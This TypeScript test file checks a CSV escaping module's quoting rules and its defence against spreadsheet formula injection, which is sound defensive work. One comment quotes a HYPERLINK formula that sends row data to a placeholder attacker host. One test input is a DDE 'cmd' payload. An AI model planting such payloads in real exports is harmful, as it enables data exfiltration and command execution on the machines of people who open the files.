import { describe, expect, it } from "vitest";

import {
  CSV_ROW_SEPARATOR,
  csvRow,
  escapeCsvField,
  neutraliseFormula,
} from "@/lib/csv/escape";

/**
 * CSV serialisation (Phase 4 slice 4.2).
 *
 * The plan names four cases explicitly — a comma, a quote, a newline, and a
 * leading `=` — and each gets its own test with its own name, because they are
 * four different failures. The first three corrupt a file. The fourth executes
 * on the machine of whoever opens it.
 */

describe("escapeCsvField — RFC 4180 quoting", () => {
  it("quotes a field containing a comma", () => {
    // Unquoted, this one value becomes two columns and every column after it
    // in the row shifts. The file still opens, and every row below is wrong.
    expect(escapeCsvField("Smith, Jane")).toBe('"Smith, Jane"');
  });

  it("quotes a field containing a double quote, and doubles the quote", () => {
    // A single quote inside an unquoted field is what makes a parser start
    // reading the rest of the file as one enormous cell.
    expect(escapeCsvField('she said "no"')).toBe('"she said ""no"""');
  });

  it("quotes a field containing a newline", () => {
    // A raw newline ends the row. The remainder becomes a row of its own, with
    // its columns offset by one — silently, in the middle of a subscriber list.
    expect(escapeCsvField("line one\nline two")).toBe('"line one\nline two"');
  });

  it("quotes a field containing a carriage return", () => {
    // CRLF is the row separator, so a lone CR is the same hazard as a newline.
    expect(escapeCsvField("line one\r\nline two")).toBe(
      '"line one\r\nline two"'
    );
  });

  it("leaves an ordinary field alone", () => {
    expect(escapeCsvField("reader@example.test")).toBe("reader@example.test");
  });

  it("renders null and undefined as an empty field, not as the word", () => {
    // `confirmed_at` is nullable. Writing the literal string "null" into an
    // export is a value a founder then mails.
    expect(escapeCsvField(null)).toBe("");
    expect(escapeCsvField(undefined)).toBe("");
  });
});

describe("escapeCsvField — formula injection", () => {
  it("neutralises a field beginning with = (formula injection)", () => {
    // The headline risk. `=HYPERLINK("https://attacker.example/?"&A1,"Click")`
    // in a cell is a link that exfiltrates the row beside it the moment the
    // founder opens their own export.
    expect(escapeCsvField("=1+1")).toBe("'=1+1");
  });

  it("neutralises a field beginning with +", () => {
    expect(escapeCsvField("+1+1")).toBe("'+1+1");
  });

  it("neutralises a field beginning with -", () => {
    expect(escapeCsvField("-1+1")).toBe("'-1+1");
  });

  it("neutralises a field beginning with @", () => {
    // Excel's legacy Lotus-style function call.
    expect(escapeCsvField("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
  });

  it("neutralises a trigger hidden behind a leading tab", () => {
    // Excel strips leading whitespace before deciding whether a cell is a
    // formula, so `\t=1+1` is evaluated and a bare `startsWith("=")` check is
    // bypassed by one tab character. The tab itself is on the trigger list for
    // that reason, and the apostrophe lands in front of it.
    //
    // No CSV quotes: a tab obliges none under RFC 4180, and the neutralising
    // prefix has already done the work that matters.
    expect(escapeCsvField("\t=1+1")).toBe("'\t=1+1");
  });

  it("neutralises a trigger hidden behind a leading carriage return", () => {
    // Same bypass, and the CR *does* oblige quoting — so this is the case
    // where both halves of the module have to fire on one value.
    expect(escapeCsvField("\r=1+1")).toBe(`"'\r=1+1"`);
  });

  it("neutralises before quoting, not after", () => {
    // The order is the whole correctness argument. Quoting first would make
    // every field start with `"`, which is never a trigger, so the check would
    // pass on everything and neutralise nothing.
    const field = escapeCsvField('=cmd|"/c calc"!A0');

    expect(field.startsWith(`"'`)).toBe(true);
    expect(field).toBe(`"'=cmd|""/c calc""!A0"`);
  });

  it("does not touch a value that merely contains a trigger", () => {
    // A spreadsheet only evaluates a cell whose text *starts* with one.
    // Prefixing every address containing a hyphen would be data corruption.
    expect(escapeCsvField("first-last@example.test")).toBe(
      "first-last@example.test"
    );
  });
});

describe("neutraliseFormula", () => {
  it("leaves an empty string alone", () => {
    expect(neutraliseFormula("")).toBe("");
  });
});

describe("csvRow", () => {
  it("joins escaped fields and terminates with CRLF", () => {
    expect(csvRow(["a", "b"])).toBe(`a,b${CSV_ROW_SEPARATOR}`);
  });

  it("escapes every field it is given", () => {
    // The property that matters when a column is added later: nothing is
    // exempt, so a new field cannot be the one somebody forgot.
    expect(csvRow(["=1+1", "Smith, Jane", null])).toBe(
      `'=1+1,"Smith, Jane",${CSV_ROW_SEPARATOR}`
    );
  });
});
